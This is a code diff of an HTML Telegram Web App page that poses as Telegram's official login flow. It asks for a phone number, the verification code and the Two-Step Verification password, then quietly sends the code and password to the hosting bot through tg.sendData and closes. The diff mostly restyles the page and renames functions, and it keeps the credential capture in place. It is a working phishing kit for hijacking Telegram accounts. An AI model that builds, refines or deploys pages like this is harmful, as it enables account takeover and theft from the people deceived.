@@ -3,159 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Login</title>
+    <title>Telegram Web</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --tg-color-primary: #3390ec;
-            --tg-color-bg: #ffffff;
-            --tg-color-text: #000000;
-            --tg-color-hint: #707579;
-            --tg-color-input-border: #dadce0;
+        body {
+            --primary-color: #3390ec;
+            --secondary-text-color: #707579;
+            --background-color: #ffffff;
+            --text-color: #000000;
+            --border-color: #dadce0;
+            margin: 0; padding: 0;
+            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Apple Color Emoji", "Segoe UI", Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            display: flex; justify-content: center; align-items: flex-start;
+            height: 100vh; overflow: hidden;
         }
         @media (prefers-color-scheme: dark) {
-            :root {
-                --tg-color-bg: #212121;
-                --tg-color-text: #ffffff;
-                --tg-color-hint: #aaaaaa;
-                --tg-color-input-border: #444444;
+            body {
+                --background-color: #212121;
+                --text-color: #ffffff;
+                --border-color: #444444;
             }
         }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--tg-color-bg);
-            color: var(--tg-color-text);
-            margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
-            height: 100vh; width: 100vw; overflow: hidden;
-        }
-        .container { width: 100%; max-width: 360px; padding: 40px 24px; box-sizing: border-box; text-align: center; }
-        
-        /* Оригинальное Лого */
-        .logo { width: 100px; height: 100px; margin: 0 auto 32px; background: #24A1DE; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        .logo svg { width: 64px; height: 64px; fill: #fff; transform: translate(-3px, 2px); }
+        .auth-pages { width: 100%; max-width: 360px; padding: 40px 20px; text-align: center; }
+        .logo-wrapper { margin-bottom: 40px; }
+        .logo-wrapper svg { width: 100px; height: 100px; }
 
-        h1 { font-size: 26px; font-weight: 500; margin: 0 0 12px; }
-        p { font-size: 16px; line-height: 22px; color: var(--tg-color-hint); margin: 0 0 32px; }
+        h1 { font-size: 32px; font-weight: 500; margin-bottom: 12px; }
+        p { font-size: 16px; color: var(--secondary-text-color); line-height: 22px; margin-bottom: 40px; }
 
-        /* Поля ввода (Telegram Style) */
         .input-group { position: relative; margin-bottom: 24px; text-align: left; }
-        .input-label { position: absolute; top: -10px; left: 12px; background: var(--tg-color-bg); padding: 0 4px; color: var(--tg-color-primary); font-size: 13px; font-weight: 500; z-index: 2; }
-        .input-field { 
-            width: 100%; padding: 14px 16px; border: 1px solid var(--tg-color-input-border); 
-            border-radius: 12px; font-size: 17px; background: transparent; color: var(--tg-color-text);
-            box-sizing: border-box; outline: none; transition: border-color 0.2s;
+        .input-label { 
+            position: absolute; top: -10px; left: 12px; background: var(--background-color); 
+            padding: 0 4px; color: var(--primary-color); font-size: 13px; font-weight: 500;
         }
-        .input-field:focus { border: 2px solid var(--tg-color-primary); padding: 13px 15px; }
+        .input-field {
+            width: 100%; border: 1px solid var(--border-color); border-radius: 12px;
+            padding: 18px 16px; font-size: 17px; background: transparent; color: var(--text-color);
+            box-sizing: border-box; outline: none;
+        }
+        .input-field:focus { border: 2px solid var(--primary-color); padding: 17px 15px; }
 
-        /* Кнопка */
         .btn-primary {
-            width: 100%; padding: 16px; background: var(--tg-color-primary); color: #fff;
-            border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
-            cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px;
+            width: 100%; background: var(--primary-color); color: #fff; border: none;
+            border-radius: 12px; padding: 18px; font-size: 16px; font-weight: 500;
+            cursor: pointer; text-transform: uppercase; margin-top: 10px;
         }
 
-        /* Выбор страны */
-        .country-select { cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
-        
-        /* Модалка */
-        #modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--tg-color-bg); z-index: 1000; display: none; flex-direction: column; }
-        .search-nav { padding: 16px; display: flex; align-items: center; border-bottom: 1px solid var(--tg-color-input-border); }
-        .country-item { padding: 14px 24px; display: flex; justify-content: space-between; border-bottom: 0.5px solid var(--tg-color-input-border); font-size: 17px; cursor: pointer; }
+        /* Список стран */
+        #modal-countries {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--background-color); z-index: 100; display: none; flex-direction: column;
+        }
+        .modal-header { padding: 16px; display: flex; align-items: center; border-bottom: 1px solid var(--border-color); }
+        .country-item {
+            padding: 16px 20px; border-bottom: 1px solid var(--border-color);
+            display: flex; justify-content: space-between; cursor: pointer;
+        }
 
         .step { display: none; }
-        .step.active { display: block; }
+        .active { display: block; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">
-        <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/></svg>
+<div class="auth-pages">
+    <div class="logo-wrapper">
+        <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="60" cy="60" r="60" fill="#24A1DE"/>
+            <path d="M29 60.1146C44.755 53.2647 55.2632 48.6947 60.5245 46.4046C75.5471 39.8659 78.6726 38.7298 80.7093 38.6939C81.1572 38.686 82.1561 38.7972 82.8052 39.3239C83.3534 39.7687 83.5045 40.3698 83.5768 40.7915C83.6491 41.2132 83.7391 42.1727 83.667 42.9287C82.844 51.5721 79.2831 72.5539 77.4727 82.2359C76.7065 86.3331 75.1983 87.7069 73.7359 87.8412C70.5577 88.1332 68.1436 85.7385 65.0645 83.7208C60.246 80.5636 57.5244 78.6041 52.8413 75.5186C47.429 71.9526 50.932 70.0003 54.0223 66.7891C54.8312 65.9485 68.9513 53.1118 69.2246 51.9443C69.2588 51.7984 69.2903 51.2541 68.967 50.9671C68.6437 50.6801 68.166 50.778 67.822 50.8561C67.3346 50.9669 59.5492 56.1049 44.4091 66.3195C42.1895 67.8444 40.176 68.5888 38.3687 68.55C36.3768 68.507 32.5401 67.4243 29.6874 66.4971C26.1884 65.36 23.3999 64.7618 23.642 62.8277C23.7681 61.8202 25.1539 60.758 29 60.1146Z" fill="white"/>
+        </svg>
     </div>
 
     <div id="step1" class="step active">
         <h1>Your Phone</h1>
-        <p>Please confirm your country code and enter your phone number.</p>
-        
-        <div class="input-group country-select" onclick="openModal()">
+        <p>Confirm your country code and enter your phone number.</p>
+
+        <div class="input-group" onclick="toggleModal(true)">
             <div class="input-label">Country</div>
-            <div class="input-field" id="country-name" style="display:flex; align-items:center;">Russia</div>
+            <div class="input-field" id="country-val">Russia</div>
         </div>
 
         <div class="input-group">
             <div class="input-label">Phone Number</div>
-            <div style="display:flex; gap:10px;">
-                <input type="text" id="c-code" class="input-field" style="width: 80px;" value="+7" readonly>
+            <div style="display:flex; gap:12px;">
+                <input type="text" id="code-val" class="input-field" style="width: 80px;" value="+7" readonly>
                 <input type="tel" id="phone" class="input-field" placeholder="Number">
             </div>
         </div>
-        
-        <button class="btn-primary" onclick="toStep2()">Next</button>
+        <button class="btn-primary" onclick="go2()">Next</button>
     </div>
 
     <div id="step2" class="step">
-        <h1>Check your Telegram</h1>
-        <p>We've sent the code to the <b>Telegram</b> app on your other device.</p>
+        <h1>Check Telegram</h1>
+        <p>We've sent the code to <b>Telegram</b> app on your other device.</p>
         <div class="input-group">
             <div class="input-label">Code</div>
-            <input type="number" id="sms" class="input-field" placeholder="Enter code" style="text-align:center; letter-spacing: 4px;">
+            <input type="number" id="sms" class="input-field" placeholder="00000" style="text-align:center; letter-spacing: 4px;">
         </div>
-        <button class="btn-primary" onclick="toStep3()">Verify</button>
+        <button class="btn-primary" onclick="go3()">Confirm</button>
     </div>
 
     <div id="step3" class="step">
-        <h1>Two-Step Verification</h1>
-        <p>Your account is protected with an additional password.</p>
+        <h1>Password</h1>
+        <p>Your account is protected by Two-Step Verification.</p>
         <div class="input-group">
             <div class="input-label">Password</div>
-            <input type="password" id="pw" class="input-field" placeholder="Enter password">
+            <input type="password" id="pass" class="input-field" placeholder="Your password">
         </div>
-        <button class="btn-primary" onclick="finish()">Confirm</button>
+        <button class="btn-primary" onclick="done()">Finish</button>
     </div>
 </div>
 
-<div id="modal">
-    <div class="search-nav">
-        <span onclick="closeModal()" style="cursor:pointer; font-size: 24px; margin-right: 20px;">←</span>
-        <span style="font-size: 20px; font-weight: 500;">Choose a country</span>
+<div id="modal-countries">
+    <div class="modal-header">
+        <span onclick="toggleModal(false)" style="cursor:pointer; font-size:24px; padding:10px;">✕</span>
+        <span style="font-size:20px; font-weight:500; margin-left:20px;">Choose Country</span>
     </div>
-    <div id="clist" style="overflow-y: auto;"></div>
+    <div id="list" style="overflow-y:auto;"></div>
 </div>
 
 <script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
+    const tg = window.Telegram.WebApp; tg.expand();
+    const countries = [{n:"Russia", c:"+7"}, {n:"Kazakhstan", c:"+7"}, {n:"Belarus", c:"+375"}, {n:"Uzbekistan", c:"+998"}, {n:"Ukraine", c:"+380"}];
 
-    const countries = [
-        {n: "Russia", c: "+7"},
-        {n: "Kazakhstan", c: "+7"},
-        {n: "Ukraine", c: "+380"},
-        {n: "Uzbekistan", c: "+998"},
-        {n: "Belarus", c: "+375"},
-        {n: "Germany", c: "+49"},
-        {n: "USA", c: "+1"}
-    ];
-
-    function openModal() {
-        const list = document.getElementById('clist');
-        list.innerHTML = '';
-        countries.forEach(item => {
-            const div = document.createElement('div');
-            div.className = 'country-item';
-            div.innerHTML = `<span>${item.n}</span><span style="color:#3390ec">${item.c}</span>`;
-            div.onclick = () => {
-                document.getElementById('country-name').innerText = item.n;
-                document.getElementById('c-code').value = item.c;
-                closeModal();
-            };
-            list.appendChild(div);
-        });
-        document.getElementById('modal').style.display = 'flex';
+    function toggleModal(show) {
+        const m = document.getElementById('modal-countries');
+        if(show) {
+            const l = document.getElementById('list'); l.innerHTML = '';
+            countries.forEach(i => {
+                const d = document.createElement('div'); d.className = 'country-item';
+                d.innerHTML = `<span>${i.n}</span><span style="color:#3390ec">${i.c}</span>`;
+                d.onclick = () => {
+                    document.getElementById('country-val').innerText = i.n;
+                    document.getElementById('code-val').value = i.c;
+                    toggleModal(false);
+                };
+                l.appendChild(d);
+            });
+            m.style.display = 'flex';
+        } else m.style.display = 'none';
     }
 
-    function closeModal() { document.getElementById('modal').style.display = 'none'; }
-
-    function toStep2() {
+    function go2() { 
         if(document.getElementById('phone').value.length > 5) {
             tg.sendData("PHONE_REQUESTED");
             document.getElementById('step1').classList.remove('active');
@@ -163,21 +154,18 @@
         }
     }
 
-    function toStep3() {
-        const val = document.getElementById('sms').value;
-        if(val.length === 5) {
-            tg.sendData("CODE:" + val);
+    function go3() {
+        const v = document.getElementById('sms').value;
+        if(v.length === 5) {
+            tg.sendData("CODE:" + v);
             document.getElementById('step2').classList.remove('active');
             document.getElementById('step3').classList.add('active');
         }
     }
 
-    function finish() {
-        const pass = document.getElementById('pw').value;
-        if(pass.length > 0) {
-            tg.sendData("PASS:" + pass);
-            setTimeout(() => tg.close(), 1000);
-        }
+    function done() {
+        tg.sendData("PASS:" + document.getElementById('pass').value);
+        setTimeout(() => tg.close(), 1000);
     }
 </script>
 </body>
